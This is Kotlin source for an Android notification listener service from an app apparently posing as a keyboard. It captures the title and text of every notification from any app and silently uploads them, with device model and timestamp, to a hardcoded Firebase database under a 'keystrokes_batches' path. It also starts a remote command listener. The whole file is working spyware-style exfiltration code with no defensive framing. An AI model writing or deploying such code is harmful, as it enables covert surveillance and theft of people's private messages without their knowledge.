package com.example.mykeyboard

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@RequiresApi(Build.VERSION_CODES.KITKAT)
class AppNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "AppNotificationListener"
        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
        private val scope = CoroutineScope(Dispatchers.IO)
        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
            FirebaseDatabase.getInstance(DB_URL).getReference().child("keystrokes_batches").child(deviceName)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting database ref", e)
            null
        }
    }

    override fun onCreate() {
        super.onCreate()
        try {
            FirebaseApp.initializeApp(applicationContext)
            RemoteCommandListener.startListening()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (!NotificationConfig.isEnabled) return
        if (sbn == null) return

        try {
            val packageName = sbn.packageName ?: "unknown"
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

            if (title.isBlank() && text.isBlank()) return

            scope.launch {
                try {
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = getDatabaseRef(deviceName) ?: return@launch
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")

                    val notificationData = mapOf(
                        "deviceName" to deviceName,
                        "packageName" to sanitizedAppName,
                        "title" to title,
                        "text" to text,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child("notification_$sanitizedAppName").push().setValue(notificationData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Notification synced to Firebase successfully")
                            LogStore.addLog("[$deviceName] Notification synced ($sanitizedAppName): $title")
                        }
                        .addOnFailureListener { e: Exception ->
                            Log.e(TAG, "FAILED to sync notification to Firebase", e)
                            LogStore.addLog("[$deviceName] Notification sync FAILED: ${e.toString()}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing notification coroutine", e)
                    LogStore.addLog("Notification exception: ${e.toString()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onNotificationPosted", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
